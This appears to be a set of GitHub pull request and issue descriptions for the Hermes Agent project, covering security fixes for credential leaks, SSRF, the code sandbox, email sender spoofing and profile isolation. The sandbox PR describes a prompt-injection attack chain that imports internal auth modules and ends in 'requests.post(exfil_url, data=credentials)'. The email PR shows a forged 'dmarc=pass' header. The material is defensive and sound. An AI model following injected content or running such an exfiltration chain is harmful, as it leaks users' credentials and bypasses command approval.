`main`: 1. Set a credentialed default provider, e.g. `OPENROUTER_API_KEY=sk-or-...` with `model.provider: openrouter`. 2. Add an alias pointing somewhere else, with its own key: ```yaml model_aliases: theta: model: theta-1 provider: custom base_url: "https://theta.example.com/v1" api_key: "sk-theta-..." ``` 3. Run `/model theta` (or `hermes chat -m theta`). On `main` the request carries `sk-or-...` to `theta.example.com` — 401, and the OpenRouter key has left the building. With this PR it carries `sk-theta-...`. Automated: ```bash pytest tests/hermes_cli/test_model_alias_credentials_83612.py -q # 19 passed ``` 12 of those 19 fail on an unpatched tree, so they pin the regression rather than just describing it. The leak cases assert on the credential handed to the endpoint probe — what actually goes on the wire — not just on the returned struct. Credential selection stays host-**matched**, not substring-matched, and there are tests for that: `ollama.com.attacker.test` and `127.0.0.1/ollama.com/v1` get no credential. ## Checklist ### Code - [x] I've read the [Contributing Guide](https://github.com/NousResearch/hermes-agent/blob/main/CONTRIBUTING.md) - [x] My commit messages follow [Conventional Commits](https://www.conventionalcommits.org/) (`fix(scope):`, `feat(scope):`, etc.) - [x] I searched for [existing PRs](https://github.com/NousResearch/hermes-agent/pulls) to make sure this isn't a duplicate — see **Related Issue** above; the overlap with #71410 is called out rather than glossed over. - [x] My PR contains **only** changes related to this fix/feature (no unrelated commits) - [ ] I've run `pytest tests/ -q` and all tests pass — **partially**: I could not install the full extras in my environment, so instead of the whole suite I ran the 199 test files that touch `model_switch` / `runtime_provider` / `oneshot` / `lifecycle_guard` / `terminal_tool`, twice — once with the patch and once with it reverted — and diffed the results. **No new failures.** The residual failures are pre-existing in both runs (missing optional deps in my sandbox). - [x] I've added tests for my changes (required for bug fixes, strongly encouraged for features) - [x] I've tested on my platform: Linux (Python 3.11) ### Documentation & Housekeeping - [x] I've updated relevant documentation (README, `docs/`, docstrings) - [x] I've updated `cli-config.yaml.example` if I added/changed config keys - [x] N/A — no architecture or workflow change, so `CONTRIBUTING.md` / `AGENTS.md` are untouched - [x] I've considered cross-platform impact — the change is pure credential-selection logic with no OS-specific surface; `scripts/check-windows-footguns.py --all` is clean. - [x] N/A — no tool descriptions or schemas changed ## Screenshots / Logs Credential resolution across alias shapes, with `OPENROUTER_API_KEY=sk-or-DEFAULT-SECRET` as the active session key: ``` before (main) after literal api_key sk-or-DEFAULT-SECRET → sk-literal "${THETA_API_KEY}" api_key sk-or-DEFAULT-SECRET → sk-theta-FROM-ENV key_env sk-or-DEFAULT-SECRET → sk-theta-FROM-ENV no credential, foreign host sk-or-DEFAULT-SECRET → no-key-required (leak closed) ollama.com alias sk-or-DEFAULT-SECRET → sk-ollama-KEY openrouter.ai alias (same host) sk-or-DEFAULT-SECRET → sk-or-DEFAULT-SECRET (unchanged) ```

signal.title: fix(security): recheck browser_exec's landed URL after execution
signal.text: ## What does this PR do? browser_exec validates the URLs it can see as literals in the code it is handed, and nothing after that. _blocked_url_in_code runs _URL_RE.findall on the source and checks each match once, before the subprocess is spawned. The code reaches the browser-use CLI as a Python string that is frequently not the string that was scanned, so a navigation target built at runtime or reached through a redirect is never re-examined. browser_navigate already has a post-redirect SSRF check and _current_page_private_url re-reads window.location.href after an eval for this reason. browser_exec is the one navigation surface that adopted only the pre-check. This applies the existing in-repo pattern: append a trailer that reports the landed URL, and block the output when the landed URL fails the navigation policy. SSRF protection is forced regardless of backend posture because browser_exec pipes arbitrary model-authored Python into the CLI. Output is withheld rather than annotated because stdout is where the page content comes back. No marker means the probe could not run, which fails open, matching _current_page_private_url. ## Related Issue No direct issue — discovered via code review and reproduced live (see below). Related PRs reviewed during the duplicate check (none covers this change): - #84657 [merged, verified 2026-08-12] Disable Browser Use CLI telemetry by default — search: browser use cli - #83798 [merged, verified 2026-08-12] feat(browser): auto-install the Browser Use CLI instead of silently downgrading — search: browser use cli - #84556 [open, verified 2026-08-12] fix(browser): improve Chrome launch guidance for local automation (#84507) — touches target file; identifiers: ['browser_use_cli'] - #81958 [merged, verified 2026-08-12] feat(browser): Browser Use CLI 3.0 mode — one browser_exec driver over all CDP backends (salvage #66476) — search: browser use cli - #83402 [merged, verified 2026-08-12] feat(browser): make Browser Use mode the default browser backend — search: browser use cli - #84419 [merged, verified 2026-08-12] fix: Windows agent-loop papercuts — path splitting, skill hashing, autocomplete, screenshots, OS detection — touches target file; identifiers: ['browser_use_cli'] ## Changes Made - `fix/browser-exec-landed-url-recheck` — 2 file(s) changed vs base: - `tests/tools/test_browser_use_cli.py` - `tools/browser_use_cli.py` ## How to Test Validation completed: 1. Sabotage check: pre-fix code fails the regression tests (5 failed), with the fix all pass (87 passed, 0 failed) — target `tests/tools/test_browser_use_cli.py`. 2. Suite `<full suite>`: branch 30181 passed / 9 failed vs baseline 30514 passed / 10 failed — zero branch-only failures. 3. Duplicate check: 25 potential matches reviewed — none covers this change. 4. The full repo-wide suite was run (item 2); GitHub CI remains the final confirmation environment. ## Logs Sabotage verification output: ``` # base leg (pre-fix code + branch tests): # tests: 82 passed, 5 failed # head leg (with fix): # tests: 87 passed, 0 failed ```

signal.title: fix: add system prompt guidance when Tool Search is active
signal.text: ## Problem When Tool Search activates and defers MCP/plugin tools behind the bridge tools (`tool_search`/`tool_describe`/`tool_call`), there is no system prompt guidance telling the model to search for deferred tools before concluding a capability is unavailable. **Observed behavior:** User asks "what is my first meeting tomorrow?" The model sees a `google-workspace` skill in the skills listing, loads it, finds missing OAuth credentials, and tells the user the capability isn't set up -- never discovering the fully-connected `mcp_google_workspace_get_events` tool that's deferred behind `tool_search`. **Expected behavior:** The model should call `tool_search("calendar")` before falling back to skills or giving up, discovering the connected MCP tool. ## Fix Add `TOOL_SEARCH_GUIDANCE` to `prompt_builder.py` and inject it into the system prompt when `tool_search` is in the session's `valid_tool_names`. Follows the existing pattern used by `MEMORY_GUIDANCE`, `SESSION_SEARCH_GUIDANCE`, and `SKILLS_GUIDANCE`. The guidance tells the model: - MCP and plugin tools are loaded on demand via `tool_search` - Always call `tool_search` before concluding a capability is unavailable - Deferred MCP tools are fully connected and authenticated - Prefer them over skill-based alternatives that may require separate setup 12 lines across 2 files, no new dependencies. Signed-off-by: Chris van Hoof <vanhoof@ouwish.com>

signal.title: security: sandbox PYTHONPATH hardening against credential exfiltration (#8028)
signal.text: ## Context & Long-term Vision This PR is the **first step** in a broader security architecture for Hermes Agent. The end goal is a **read/write separation model** with defense-in-depth at multiple layers: ### Phase 1 (this PR) — Harden the shared infrastructure The `execute_code` sandbox is shared infrastructure used by all agents. If an attacker can import internal modules from within it, they can exfiltrate credentials regardless of which agent invoked it. This PR removes the hermes-agent root from PYTHONPATH and installs an import guard — the prerequisite that makes everything below viable. ### Phase 2 — Read-only sub-agents Sub-agents dedicated to reading external content (`web_search`, `web_extract`, `read_file`, MCP dataservices) that possess **only read tools**. No write access, no terminal, no filesystem writes, no email, no cron. If a prompt injection succeeds inside a read worker, the attacker can only read — not execute destructive actions. ### Phase 3 — LLM gatekeeper A small, lightweight LLM layer that verifies read worker output **before** injecting it into the main agent context. The gatekeeper checks for prompt injection patterns, behavioral directives, or any text that attempts to alter agent behavior. This is a supplementary security layer that catches residual injections that bypassed earlier defenses. ### Phase 4 — Write sub-agents The main agent retains full tool access for writing, execution, and user-facing actions. It only receives **sanitized content** from read workers (validated by the gatekeeper), keeping the attack surface between external data and internal actions as narrow as possible. --- ## Problem The `execute_code` sandbox currently adds the **hermes-agent root** directory to `PYTHONPATH`, allowing sandboxed scripts to `import` any internal Hermes module — including: - `hermes_cli.auth` — OAuth tokens, `auth.json` - `agent.credential_pool` — API keys, session credentials - `tools.approval` — bypass command approval system - `tools.terminal_tool` — force dangerous commands - `gateway` — messaging, user authorization A prompt-injected script from `web_extract`, `read_file`, or any external content source can silently exfiltrate all credentials, bypass approvals, and execute arbitrary commands without user interaction. **Related:** Issue #8028 (closed "not planned") — Docker isolation alone does not prevent this, as the process itself has full access to internal modules and `.env` files. ## Solution **Two-layer defense:** ### Layer 1: Remove hermes-agent root from PYTHONPATH Only the staging `tmpdir` remains on `PYTHONPATH`. Scripts can still import the generated `hermes_tools` stub (the official controlled API) and all stdlib/venv packages (pandas, requests, etc.), but cannot reach internal Hermes modules. ### Layer 2: `sys.meta_path` import guard A meta path finder is prepended to every sandbox script. It intercepts import attempts for `hermes_cli`, `agent`, `tools`, `gateway` and raises `ImportError` immediately — defense-in-depth against edge cases (`.pth` files, symlinks, project venvs with hermes-agent source installed). ## What is blocked | Package | Exposes | |---------|---------| | `hermes_cli` | OAuth tokens, auth.json, CLI internals | | `agent` | credential_pool, session state, prompt builder | | `tools` | approval bypass, terminal_tool force=True | | `gateway` | messaging connections, user authorization | ## What is preserved - `hermes_tools` API — the controlled interface remains importable - Stdlib — `json`, `os`, `sys`, `pathlib`, `re`, `math`, `csv`... - Venv packages — `pandas`, `requests`, `numpy`, `beautifulsoup4`... - All agent capabilities — file editing (`patch`, `write_file`), git, rebuilds use native tools, not the sandbox ## Zero impact on legitimate usage The agent never needs to import internal Hermes modules from within `execute_code`. All credential access goes through native tool calls with proper auth injection. This change only affects the sandbox subprocess, which is exclusively used for data processing scripts. ## Attack chain this closes ``` web_extract → prompt injection → execute_code → import hermes_cli.auth → read OAuth tokens → import agent.credential_pool → read API keys → import tools.approval → bypass command approval → requests.post(exfil_url, data=credentials) ``` After this fix, the chain breaks at `import` with `ImportError`. ## Diff **1 file changed, 121 insertions(+), 8 deletions(-)** — clean single-commit PR, no unrelated changes.

signal.title: fix(ssh): preflight sync-back size before tar download
signal.text: ## Summary - add a remote `.hermes` size preflight before SSH sync-back starts streaming a tarball into local `/tmp` - prefer GNU `du -sb`, with BSD/macOS `du -sk` fallback converted to bytes - refuse oversized sync-back before download using the existing `_SYNC_BACK_MAX_BYTES` cap - add focused unit tests for oversize refusal, invalid size output, preflight failure, successful tar streaming, and BSD fallback command shape ## Why In a production SSH-backed worker setup, remote `/root/.hermes` grew to several GiB. During worker cleanup Hermes streamed `tar cf - -C / root/.hermes` into local `/tmp/tmp*.tar`; the existing 2 GiB cap only runs after the tar is downloaded, so the Hermes host disk filled before sync-back could be rejected. Failing before the tar stream protects the host from disk pressure while preserving the existing post-download cap as a second line of defence. ## Test Plan ```bash python3 -m py_compile tools/environments/ssh.py tests/tools/test_ssh_bulk_upload.py python3 -m pytest tests/tools/test_ssh_bulk_upload.py -q -o 'addopts=' python3 -m pytest tests/tools/test_file_sync_back.py tests/tools/test_ssh_environment.py tests/tools/test_ssh_bulk_upload.py -q -o 'addopts=' git diff --check ``` Results locally: ```text 26 passed in 0.70s 58 passed, 11 skipped in 1.32s ```

signal.title: [Feature]: Design mode — element selection bridge from desktop preview/browser pane to agent context
signal.text: ## What A "design mode" for the Hermes desktop app: click an element in the preview pane (or the in-app browser panel from #48760), and the selection is piped to the agent as structured context (tag, classes, text content, bounding box, and a best-effort source hint), so the user can say "make this button bigger" and the agent edits the right file. ## Why Cursor, Claude Code, and v0 all have some form of this loop, and it's the highest-friction gap when using Hermes for frontend work today. The agent can open a dev server in the preview pane via `open_preview` and read back page text with `read_preview`, but there's no path from "the thing I'm looking at" to "the element the agent edits." Users describe elements in prose ("the blue button near the top") and the agent greps for it. It works, but it's the slow version of the loop. ## Proposed shape 1. **Selection overlay in the preview webview**: a toggle (palette command / keybind) that highlights elements on hover and captures click selection, similar to browser devtools inspect mode. 2. **Selection → agent context**: the captured element info is attached to the user's next message (or exposed via a `read_preview_selection` tool the agent can call), riding the same gateway blocking-bridge pattern `read_terminal` and #48760's `desktop_browser_*` tools use. 3. **Source hint (best effort)**: for localhost dev servers, include `data-*` attributes or sourcemap-derived file hints when available; degrade gracefully to selector + text content when not. 4. The agent side needs no new core concepts: it receives the selection as context and uses existing file tools to make the edit, then the preview hot-reloads. ## Notes - Depends conceptually on #48760 (the browser panel) but could prototype against the existing preview pane first. - Desktop-gated (`HERMES_DESKTOP`), no impact on CLI/gateway surfaces. - I'm happy to prototype this as a desktop plugin first to validate the interaction model before proposing core changes. ## A note on authorship This issue was cowritten with my Hermes agent (running on this repo's own codebase as its reference), and I'd genuinely love to help implement it, with that same agent pairing with me on the work. Filing it first to get the team's read on direction before writing code. ## Related - #48760 (in-app browser side panel + agent control) - #68364 (agent-assisted skin builder, adjacent "agent edits live UI" territory)

signal.title: fix(doctor): recognize user-configured aggregator providers for vendor slugs
signal.text: ## Summary Two small changes so that a user-configured aggregator provider declared under `providers:` in `config.yaml` is correctly recognized as accepting `vendor/model` slugs — instead of being flagged as a misconfiguration. ## Problem A user who fronts an OpenAI-compatible aggregator gateway via the keyed `providers:` section (e.g. `providers.orcarouter` with `base_url: https://api.orcarouter.ai/v1` serving `deepseek/deepseek-v4-pro-free`) gets a false-positive warning from `hermes doctor`: ``` model.default 'deepseek/deepseek-v4-pro-free' is vendor-prefixed but model.provider is 'orcarouter' ``` Root cause is two-fold: 1. `resolve_user_provider()` hardcodes `is_aggregator=False` and never reads an `is_aggregator` field from the provider config, so a keyed `providers:` entry can never be an aggregator. 2. `doctor` decides vendor-slug acceptance from a hardcoded `providers_accepting_vendor_slugs` set plus the `custom:` string prefix — neither of which covers a keyed `providers:` entry. The deadlock: `orcarouter` resolves with a bare id (no `custom:` prefix, so `is_aggregator` is False), while the `custom:orcarouter` alias does not resolve back through the keyed `providers:` section at all. ## Change - `hermes_cli/providers.py`: `resolve_user_provider()` now reads `is_aggregator` from the provider entry (`bool(entry.get("is_aggregator", False))`), defaulting to `False` for full backward compatibility. - `hermes_cli/doctor.py`: the vendor-slug check now additionally resolves the configured provider and honors its `is_aggregator` flag. With this, a user opts in by adding `is_aggregator: true` under their `providers.<name>` entry, and `doctor` stops warning. ## Validation - `py_compile` passes for both modified files. - `resolve_provider_full("orcarouter").is_aggregator` is `True` once `is_aggregator: true` is set in config (verified locally against the current checkout). - Backward compatible: absent the flag, behavior is unchanged.

signal.title: fix(gateway): sort /resume session list by last activity, not creation time (#88222)
signal.text: ## Problem `/resume` session list in the messaging gateway sorts by **session creation time** (`ORDER BY s.started_at DESC`) and applies `limit=10` **before** filtering for titled sessions. Every other surface (desktop, dashboard, CLI) sorts by last activity (`order_by_last_active=True`). This causes: 1. **Ordering divergence** — same conversation appears in different order depending on surface. 2. **Titled session starvation** — untitled `session_switch` shells consume slots in the `limit=10` window, pushing out old but actively-used titled sessions. ## Fix Pass `order_by_last_active=True` to `list_sessions_rich()` in `_list_titled_sessions()`. This is the same parameter already used by: - `tui_gateway/server.py` (~line 12846) — desktop session list - `gateway/platforms/api_server.py` — dashboard API - CLI search path ## Change ```python # Before sessions = await self._session_db.list_sessions_rich( source=user_source, session_key=None if widen else session_key, limit=10, ) # After sessions = await self._session_db.list_sessions_rich( source=user_source, session_key=None if widen else session_key, limit=10, order_by_last_active=True, ) ``` Fixes #88222

signal.title: feat(desktop): system-wide selection assistant — floating AI panel appears when selecting text in any app
signal.text: ## Summary Add a **system-wide selection assistant** like Cherry Studio's *Selection Assistant* (划词助手) and Doubao's *划词快捷助手*: whenever I select text in **any application** — browser, PDF reader, Word, code editor, terminal, anything — a small floating panel automatically appears right next to the selection, offering one-tap AI actions on that text. ## Desired experience 1. I select some text anywhere on the system. 2. A floating panel appears beside the selection (Cherry Studio / Doubao style), showing quick actions such as: - **Translate** - **Explain** - **Summarize** - **Ask Hermes…** (free-form question about the selection) 3. Clicking an action shows the answer **right there in the panel**, streamed live — no window switching, no copy-paste. 4. From the result I can: - **Copy** the answer - **Continue in Hermes** — jump into a full session carrying the selected text and the answer as context, so I can keep going with Hermes' full capabilities (tools, skills, memory) - Dismiss with Esc or by clicking away 5. The interaction should work regardless of which app has focus; the panel should feel lightweight and instant, like Cherry Studio's. Configurable: enable/disable, which actions appear, default action, target session for "continue" (new vs. current), custom prompt templates per action. ## Motivation Today, asking Hermes about something I'm reading is a 4-step context switch: select → copy → switch to Hermes → paste → type the question. That friction means I simply don't do it for quick things like translating a sentence or understanding a paragraph. With a selection assistant the loop becomes: **select → get the answer where I am**. For translation-heavy or reading-heavy workflows (documentation, papers, foreign-language content) this is the difference between reaching for Hermes constantly and not at all. Cherry Studio and Doubao have proven this is one of the most-used daily features for Chinese users especially; Hermes has the stronger agent behind it (tools, skills, memory, any provider) but no way to surface it at the point of reading. ## Precedents - **Cherry Studio** — Selection Assistant (划词助手): select text → floating panel with translate/explain/summarize/custom actions - **Doubao (豆包)** — 划词快捷助手, same pattern, system-wide - **PopClip** (macOS) + AI extensions — the same interaction family - In-repo, the in-chat half of this interaction is already requested: #66121 (floating "Reply with selection" button), #52554, #73138 — this issue is the system-wide half.

signal.title: [Bug]: macOS: hermes update reports success while the launchd reload helper dies before bootstrapping — gateway left unregistered for 36 min (post-#80491)
signal.text: ## Summary On macOS, `hermes update` printed `✓ Update complete! (v0.20.3)` and exited 0 while the `ai.hermes.gateway` LaunchAgent was left **unloaded from launchd** for 36 minutes. No warning was printed and no failure was logged. This is **not** #74973 (job already booted out *before* the update) and **not** the mechanism fixed by #80491 — that fix is present in my tree and its `FAILED` line never fired, because the helper died before reaching the code that writes it. Two independent gaps combine here: 1. The reload helper spawned by `launchd_reload()` can die **before its first bootstrap attempt**, leaving `launchd-reload.log` with only the "helper started" marker — no retry lines, no `FAILED` line (the post-#80491 failure line never runs). 2. `update_cmd.py` treats "`launchd_restart()` returned without raising" as success and appends the label to `restarted_services` with **no verification that a supervised PID exists**. Since the reload is asynchronous, any helper failure is invisible. ## Environment - Hermes Agent **v0.20.3**, git install, `main` @ `a3995f8` - Contains #80491 (`fe3a1cad6`, merged 2026-08-06) — verified via `git merge-base --is-ancestor` - macOS **26.6.1** (build 25G76), Apple Silicon (arm64) - Python 3.11.15 (venv) - Gateway installed as LaunchAgent `ai.hermes.gateway` (`KeepAlive=true`, `RunAtLoad=true`) ## Timeline (from my logs; paths redacted) ``` 08:56:04 launchd-reload.log: "Launchd reload helper started for gui/<uid>/ai.hermes.gateway" --> and then NOTHING, ever. No attempt lines. No FAILED line. 08:56:06 gateway.log: Received SIGTERM Shutdown context: signal=SIGTERM under_systemd=yes parent_pid=1 --> PPID=1 means the job WAS loaded and launchd-supervised at this moment 08:56:12 Exiting with code 1 (signal-initiated shutdown without restart request) 08:56:14 gateway-exit-diag.log: gateway.start pid=36740 argv: [".../hermes_cli/main.py", "gateway", "run", "--replace", "--external-supervisor"] 08:56:18 Received SIGTERM as a planned gateway stop -- exiting cleanly Shutdown context: signal=SIGTERM under_systemd=no parent_pid=36734 --> killed by the update process, NOT by launchd 08:56:22 gateway.exit_clean pid=36740 --> no further gateway.start in gateway-exit-diag.log 09:13 update prints "✓ Update complete! (v0.20.3)", exit 0 <-- gateway is DOWN 09:32 I manually ran: launchctl bootstrap gui/<uid> <plist> <-- recovered ``` `launchctl print gui/<uid>/ai.hermes.gateway` during the window: `Could not find service "ai.hermes.gateway" in domain for user gui: <uid>` The plist file itself was intact the whole time (mtime 08:56, rewritten by the update). ## Why this is distinct from #80491 #80491 is in my tree and its logic is present in `hermes_cli/gateway.py` — the helper script requires a positive PID rather than a bare exit-0, and writes a `FAILED launchd reload for ... service NOT registered` line to `launchd-reload.log` when the retry budget is exhausted. That `FAILED` line **never appeared**. The helper never got far enough to run it. The generated `reload_script` opens with `sleep 2`, and the update's parent process exited during that window — so the whole helper went away before its first `launchctl bootout` / `bootstrap`. So #80491 correctly hardened *how success is judged once the helper runs*; it does not cover *the helper not surviving to run at all*. ## Why this is distinct from #74973 / #75021 #74973's repro step 3 requires `launchctl list | grep ai.hermes.gateway` to be **empty** before the update starts. In my case the opposite held: at 08:56:06 the gateway logged `under_systemd=yes parent_pid=1`, i.e. it was alive and launchd-supervised. #75021's reworked helper still ends with: ```python launchd_restart() return [label] # success is assumed, never verified ``` Only `subprocess.CalledProcessError` triggers `_warn_launchd_gateway_left_down()`. My failure raises nothing: `launchd_restart()` takes the `_request_gateway_self_restart(pid)` branch and returns normally, the async helper dies silently afterwards. So #75021 as written would still report success here. ## Empirically ruled out I probed these on the affected machine before filing, to save reviewer time: 1. **`launchctl submit` is NOT dead on macOS 26.6.1.** A probe job submitted via `launchctl submit -l <label> -o <log> -- /bin/bash -c 'echo PROBE_OK'` ran and wrote its output. The mechanism itself works. 2. **`launchctl bootout` does NOT kill the `launchctl submit` script that issued it.** A 4-step probe (echo -> bootout -> echo -> sleep 2 -> echo -> bootstrap -> echo) completed all four steps. Self-termination is not the cause. ## Additional finding: `bootstrap` can return rc=0 without registering While probing I hit a state worth flagging independently: ``` bootout_rc=0 bootstrap_rc=0 --> launchctl list <label>: not registered ``` A standalone retry moments later registered fine. So on macOS 26.6.1 a `bootstrap` issued shortly after a `bootout` can report success while the service is not actually registered. This reinforces #80491's direction: **success must be judged by a live supervised PID, never by an exit code** — and that rule needs to apply to the `update_cmd.py` caller too, not just inside the helper. ## Impact Messaging adapters and all cron jobs stayed dark for 36 minutes. `KeepAlive` cannot help because the job definition was deregistered. The only signal was that the bot stopped replying — `hermes update` itself reported success. ## Suggested direction (not a patch) After `launchd_restart()` returns, poll for a supervised PID (`launchctl list <label>` reporting a positive PID) for a bounded window before appending to `restarted_services`. If it never appears, print the same `_warn_launchd_gateway_left_down()` warning that the `CalledProcessError` path already prints. That closes the async gap without depending on the helper's own liveness. Note: an equivalent post-restart verification gap was reported and fixed on the systemd side (#6631) but was never applied to the macOS path. ## Workaround for other users ```bash # after any `hermes update` on macOS: launchctl list | grep ai.hermes.gateway || \ launchctl bootstrap gui/$(id -u) ~/Library/LaunchAgents/ai.hermes.gateway.plist ```
signal.author: yobo2u

signal.title: [Bug] Profile directory '~/.hermes/profiles/0' is created without a config.yaml on v0.20.3 first launch
signal.text: ## Bug: Profile directory `~/.hermes/profiles/0` is created without a config.yaml on v0.20.3 first launch After updating to **v0.20.3 (2026.8.16.2)**, a profile directory named `0` (the literal digit zero) is created on first launch of the desktop client. It has no `config.yaml`, no `pairing/`, no `assets/avatar.png`, no `memories/`, but it does have a `state.db`, `projects.db`, `SOUL.md`, `cron/executions.db`, and a default Hermes `state.db` schema. The directory name `0` is a sentinel / placeholder that's not a valid profile name (existing profiles are like `admin`, `default`, `ta-ra`, `coder`, etc.). It looks like a profile bootstrap path that wasn't routed through the named profile validator. ### Repro 1. Update Hermes to v0.20.3 (2026.8.16.2). 2. Launch the desktop client for the first time after the update. 3. Open `~/.hermes/profiles/` and a `0` directory is present alongside the other profiles. ```bash $ ls -la ~/.hermes/profiles/ | grep -E 'macmini|0$' drwx------ 20 lyraai staff 640 Aug 18 06:53 0 ``` ```bash $ hermes profile list | grep ' 0 ' 0 — stopped — — ``` ### Expected Either no extra profile is created, or it's created with a real name and a valid `config.yaml` (e.g. `~/.hermes/profiles/default/config.yaml`). ### Actual `~/.hermes/profiles/0/` exists with the following contents: `.update_check`, `SOUL.md`, `assets/`, `audio_cache/`, `cache/schema_columns.json`, `cron/` (with `executions.db`, `.tick.lock`, `.jobs.lock`, `ticker_heartbeat`, `ticker_last_success`), `hooks/`, `image_cache/`, `logs/` (with `agent.log`, `gui.log`, `errors.log`), `memories/`, `pairing/`, `pets/`, `projects.db`, `sessions/`, `skills/` (with `.bundled_manifest` and a full skill bundle), `state.db`, `state.db-shm`, `state.db-wal`. **No `config.yaml`**. ```bash $ cat ~/.hermes/profiles/0/.update_check {"ts": 1787016066.552982, "behind": 0, "rev": null, "ver": "0.20.3"} $ cat ~/.hermes/profiles/0/SOUL.md You are Hermes Agent, an intelligent AI assistant created by Nous Research. You are helpful, knowledgeable, and direct. ... $ hermes profile describe 0 (no description set for '0') ``` ### Likely cause A profile-init codepath receives `0` (or a falsy value, or `null`, or an integer index) somewhere in the desktop client's roster bootstrap, and falls back to coercing the path component to a string. The directory is created with the bundled manifest but the `config.yaml` writer is name-aware and skips creating the file when the name is not a valid slug. The net effect is a half-initialized profile that the CLI lists, the desktop roster shows as a profile named `0`, and the gateway ignores. ### Suggested fix - Validate the profile name against the slug pattern (`/^[a-zA-Z][a-zA-Z0-9_-]*$/`) before creating a profile directory. Reject and skip when the name is empty, `0`, or a number. - Or: in the desktop roster merge, filter out profiles whose path component is the literal digit `0` or otherwise not a valid slug. ### Workaround (local) ```bash # After stopping the gateway: rm -rf ~/.hermes/profiles/0 # (verify before deleting — see ~/.hermes/profiles/_backups/ and ~/.hermes/profiles/_archived/ for malformed profiles already moved aside) ``` ### Environment - Hermes Agent: **v0.20.3 (2026.8.16.2)** - Installed: 2026-08-18 06:51 (the `0` directory's `.update_check` confirms it was created alongside the v0.20.3 install) - macOS Mac Mini - 27 valid profiles in `~/.hermes/profiles/` (`default`, `admin`, `operator`, `ta-ra`, `secops-guard`, `sysadmin-core`, `iifr-ecp-marketing`, `coder`, `analyst`, `verifier`, `planner`, `research`, `creative`, `creative-studio`, `devops`, `architect`, `bot`, `ads-manager`, `bd`, `council`, `moa`, `latticed-bd`, `latticed-creative`, `latticed-campaign`, `cosmicmandalas`, `teaching`, plus 4 symlinked sharing pets) + 1 phantom (`0`) ### Related observation The same v0.20.3 release also causes the profile rail to display every profile twice with a `macmini` host chip (see related issue). The phantom `0` profile appears alongside the duplicated rows in the same roster. Filed by: Mac Mini admin (Muralikrishnan) — `~/.hermes/profiles/admin/`

signal.title: fix(email): require authserv-id before trusting Authentication-Results
signal.text: ## What does this PR do? `_verify_sender_authentication()` treated the first `Authentication-Results` header as the receiving server's stamp whenever `authserv_id` was empty. On a self-hosted IMAP box that does not prepend its own stamp, that "first" header is the one the sender wrote. A message with only `Authentication-Results: attacker.self; dmarc=pass` then authenticated, which is the deployment shape GHSA-rxqh-5572-8m77 was meant to close. The function now refuses every header until an `authserv_id` (config `authserv_id` or `EMAIL_AUTHSERV_ID`) is set. Operators whose mail server does not stamp results can still opt out with `require_authenticated_sender: false` / `EMAIL_TRUST_FROM_HEADER=true`. Existing tests that passed a real provider stamp without a pin now pass `authserv_id="mx.google.com"` so they still cover the parse/align path. ## Related Issue Related residual of GHSA-rxqh-5572-8m77 / #52801. #56608 hardens alias parsing and a `header.from` DKIM fallback; it does not refuse an unpinned lone header. signal.title: Multiplex gateway profiles share the default profile session database
signal.text: ## Bug description Multiplex gateway profiles share startup-created `SessionStore`/`SessionDB` instances rooted in the default profile. Secondary-profile turns can therefore persist transcripts to the default profile's `state.db` and discover default-profile sessions through ordinary `session_search`. ## Code evidence - `GatewayRunner` creates one startup-scoped `SessionStore`: `gateway/run.py:6584-6593`. - `SessionStore` creates its `SessionDB()` before secondary turn scope: `gateway/session.py:1238-1293`. - The runner creates another startup-scoped `SessionDB()` for agent tools at `gateway/run.py:6814-6819`. - Every multiplex agent receives that shared DB: `gateway/run.py:5498-5509`. - `session_search` uses the injected DB unless `profile=` is explicitly supplied: `tools/session_search_tool.py:978-1033`. - This conflicts with `_profile_runtime_scope`'s contract that sessions follow the profile home: `gateway/run.py:2067-2077`. ## Deterministic probe A default-profile DB containing a unique marker was injected exactly as the multiplex runner does while `HERMES_HOME` was scoped to a worker profile: ```text worker_home= .../profiles/worker injected_db= .../default/state.db hits= [('default-secret-session', '>>>DEFAULT_ONLY_MARKER<<<')] ``` The worker profile found the default-only transcript through ordinary discovery without an explicit cross-profile request. ## Expected behavior Each profile persists and searches only its own profile-local `state.db` unless the caller explicitly requests another profile through the existing cross-profile read interface. ## Actual behavior All multiplex agents receive the default profile's startup-created database. ## Impact Cross-profile transcript disclosure and incorrect transcript persistence. This violates the profile isolation boundary even when profile ContextVars are otherwise correct. ## Suggested fix Allocate a profile-local `SessionStore`/`SessionDB` per profile and inject the store selected by the active profile. In multiplex mode, ordinary `session_search` should be profile-scoped by construction. Add a two-profile regression test covering both persistence and discovery. ## Environment - Hermes Agent v0.20.1 - Audited commit: `56526bc0d36522ab7a87ee0056f70e3847d2f0e6` - Multiplex gateway with default and secondary profiles

Each key was grepped repo-wide first; none are shared with other surfaces (kanban's `allProfiles` and `t.profiles.allProfiles` are separate namespaces and untouched). The gateway `intro` in every locale now says connections are machine-level and profiles come from the gateways you connect. - **Tests** — component test rewritten: asserts the page loads `getConnectionConfig(null)`, never a profile-scoped config, and renders no scope UI. `savedCloudConnectionUrl` unit tests unchanged. - **Docs (same PR, per the just-merged #88773 wording)** — `website/docs/user-guide/desktop.md` and `multi-connection-desktop.md` no longer describe per-profile overrides on the Gateways page; they now state connections are machine-level, profiles are discovered from connected gateways, and per-profile routing continues via the profile rail / sessions surfaces.
